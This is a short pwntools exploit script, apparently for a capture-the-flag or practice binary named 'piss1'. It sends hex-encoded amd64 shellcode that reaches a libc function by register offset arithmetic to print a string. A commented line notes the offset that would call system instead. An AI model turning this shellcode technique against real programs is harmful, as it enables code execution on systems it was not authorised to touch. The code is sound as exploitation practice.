from pwn import *

p = process("./piss1")
p.recvuntil("Type some hex (end with newline):")

context.arch = "amd64"
code = """
pushq 0xf00d
lea rdi, [rip+lol]
subq rcx, 0xb6cfb

/* subq rcx, 0xfa00 # this will make us call system */

movq rax, 0 # printf requires 0 here
call rcx

.align 256
lol:
.string \"hellooo world\\n\"
"""
print(code)

assembled = asm(code)
p.sendline(assembled.hex())

print(assembled.hex())
p.interactive()
